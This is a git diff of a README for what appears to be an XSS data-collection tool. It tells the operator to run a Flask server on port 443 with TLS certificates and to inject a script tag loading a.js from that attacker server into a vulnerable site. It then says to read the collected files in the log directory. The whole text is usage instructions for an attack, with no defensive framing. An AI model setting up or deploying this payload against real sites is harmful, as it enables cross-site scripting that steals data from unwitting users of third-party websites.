@@ -2,15 +2,21 @@
 ### usage
 * requires python 3 and flask
 
-run on your server:
+```bash
+sudo apt update && sudo apt install -y python3-flask
+```
+
+* put ssl files in project (cert.pem, key.pem)
+
+* run on your server:
 
 ```bash
-python server.py 8091
+sudo python3 server.py 443
 ```
 
-load this script with an xss:
+* load this script with an xss:
 ```html
-<script/src="http://yourserver:8091/a.js"></script>
+<script/src="https://yourserver/a.js"></script>
 ```
 
-see the files in the log directory
+* see the files in the log directory
